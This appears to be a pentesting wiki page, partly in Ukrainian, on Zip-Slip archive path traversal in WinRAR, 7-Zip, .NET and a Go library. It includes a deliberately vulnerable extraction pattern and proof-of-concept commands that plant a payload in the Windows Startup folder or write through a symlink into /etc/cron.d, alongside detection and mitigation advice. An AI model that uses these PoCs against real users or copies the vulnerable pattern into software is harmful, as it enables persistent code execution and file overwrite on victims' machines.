# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Огляд

Багато архівних форматів (ZIP, RAR, TAR, 7-ZIP, тощо) дозволяють кожному запису мати власний **внутрішній шлях**. Якщо утиліта для розпаковки бездумно поважає цей шлях, спеціально сформований файл з ім'ям, що містить `..` або **absolute path** (наприклад `C:\Windows\System32\`), буде записаний поза межами обраного користувачем каталогу.
Цей клас вразливостей широко відомий як *Zip-Slip* або **archive extraction path traversal**.

Наслідки варіюються від перезапису довільних файлів до безпосереднього досягнення **remote code execution (RCE)** шляхом скидання payload у **auto-run** розташування, наприклад у папку *Startup* Windows.

## Коренева причина

1. Зловмисник створює архів, де один або кілька заголовків файлів містять:
* Відносні послідовності переходу (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Абсолютні шляхи (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Або спеціально створені **symlinks**, які розв'язуються поза цільовим каталогом (поширено в ZIP/TAR на *nix*).
2. Жертва розпаковує архів за допомогою вразливого інструмента, який довіряє вбудованому шляху (або слідує symlinks) замість того, щоб його очищати або примусово витягувати файли всередині обраного каталогу.
3. Файл записується у контрольоване зловмисником розташування і виконується/завантажується наступного разу, коли система або користувач активує цей шлях.

### .NET `Path.Combine` + `ZipArchive` traversal

A common .NET anti-pattern is combining the intended destination with **user-controlled** `ZipArchiveEntry.FullName` and extracting without path normalisation:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Якщо `entry.FullName` починається з `..\\`, відбувається вихід за межі цільової директорії; якщо це **абсолютний шлях**, ліва частина повністю відкидається, що призводить до **довільного запису файлу** під ідентичністю процесу розпакування.
- Архів proof-of-concept для запису в сусідню директорію `app`, яку відслідковує запланований сканер:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Розміщення цього ZIP у моніторовану вхідну скриньку призводить до появи файлу `C:\samples\app\0xdf.txt`, що доводить можливість traversal поза межі `C:\samples\queue\` і дозволяє подальші примітиви (наприклад, DLL hijacks).

## Реальний приклад – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR для Windows (включно з `rar` / `unrar` CLI, DLL та portable source) не перевіряв імена файлів під час розпакування.
Зловмисний RAR-архів, що містить запис, наприклад:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
опиниться **поза** обраним вихідним каталогом і всередині папки *Startup* користувача. Після входу в систему Windows автоматично виконує все, що там знаходиться, забезпечуючи *постійне* RCE.

### Створення PoC архіву (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – зберігати шляхи файлів точно як задано (do **not** prune leading `./`).

Deliver `evil.rar` to the victim and instruct them to extract it with a vulnerable WinRAR build.

### Зафіксовано в реальних атаках

ESET reported RomCom (Storm-0978/UNC2596) spear-phishing campaigns that attached RAR archives abusing CVE-2025-8088 to deploy customised backdoors and facilitate ransomware operations.

## Новіші випадки (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries that are **symbolic links** під час розпакування були dereferenced, що дозволяло нападникам вийти за межі каталогу призначення та перезаписати довільні шляхи. Для користувача достатньо просто відкрити/розпакувати архів.
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Impact path**: Перезапис `Start Menu/Programs/Startup` або місць запуску сервісів → код виконається при наступному вході користувача або перезапуску сервісу.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
На виправленій збірці /etc/cron.d не буде зачеплено; symlink буде розпаковано як посилання всередині /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **Fix**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Поради з виявлення

* **Static inspection** – Перегляньте записи архіву і позначайте будь‑яке ім’я, що містить `../`, `..\\`, *absolute paths* (`/`, `C:`) або записи типу *symlink*, чия ціль знаходиться поза директорією розпакування.
* **Canonicalisation** – Переконайтеся, що `realpath(join(dest, name))` усе ще починається з `dest`. Відхиляйте інакше.
* **Sandbox extraction** – Розпаковуйте у тимчасову директорію за допомогою *safe* екстрактора (наприклад, `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) і перевіряйте, що результуючі шляхи лишаються всередині директорії.
* **Endpoint monitoring** – Сигналізуйте про нові виконувані файли, записані в `Startup`/`Run`/`cron` відразу після того, як архів було відкрито WinRAR/7-Zip/etc.

## Мітігація та підвищення стійкості

1. **Update the extractor** – WinRAR 7.13+ and 7-Zip 25.00+ implement path/symlink sanitisation. Both tools still lack auto-update.
2. Extract archives with “**Do not extract paths**” / “**Ignore paths**” when possible.
3. На Unix знижуйте привілеї & монтуйте **chroot/namespace** перед розпакуванням; на Windows використовуйте **AppContainer** або пісочницю.
4. Якщо пишете власний код, нормалізуйте шляхи за допомогою `realpath()`/`PathCanonicalize()` **before** create/write, і відхиляйте будь‑який запис, що виходить за межі директорії призначення.

## Додаткові / історичні випадки

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Будь‑яка кастомна логіка розпакування, яка не викликає `PathCanonicalize` / `realpath` перед записом.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
